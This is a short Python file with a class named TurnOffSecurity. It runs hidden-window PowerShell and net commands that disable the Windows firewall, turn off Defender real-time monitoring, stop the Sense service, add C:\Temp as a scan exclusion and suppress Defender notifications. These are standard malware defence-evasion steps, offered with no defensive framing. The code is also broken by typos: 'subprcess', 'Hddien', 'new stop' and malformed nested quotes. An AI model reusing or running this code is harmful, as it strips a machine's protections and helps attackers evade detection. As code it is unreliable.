import subprcess

class TurnOffSecurity(object):
	"""docstring for TurnOffSecurity"""
	def __init__(self):
		super(TurnOffSecurity, self).__init__()
		
	def FireWall(self):
		stop_firewall = 'powershell -WindowStyle Hddien -Command "Set-NetFirewallProfile -Enabled False"'
		stop_firewall_service = 'net stop mpssvc'
		subprcess.check_output(stop_firewall, shell = True)
		subprcess.check_output(stop_firewall_service, shell = True)

	def Defender(self):
		stop_defender = 'powershell -WindowStyle Hddien -Command "Set-MpPreference -DisableRealtimeMonitoring $true"'
		stop_defender_service = 'new stop Sense'
		add_exclusion = 'powershell -WindowStyle Hddien -Command "Set-MpPreference -ExclusionPath C:\\Temp"'
		off_notifications = r'powershell -WindowStyle Hddien -Command "Set-ItemProperty -Path "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications" -Name "DisableEnhancedNotifications" -Type DWord -Value 1"'
		subprcess.check_output(stop_defender, shell = True)
		subprcess.check_output(stop_defender_service, shell = True)
		subprcess.check_output(add_exclusion, shell = True)
		subprcess.check_output(off_notifications, shell = True)

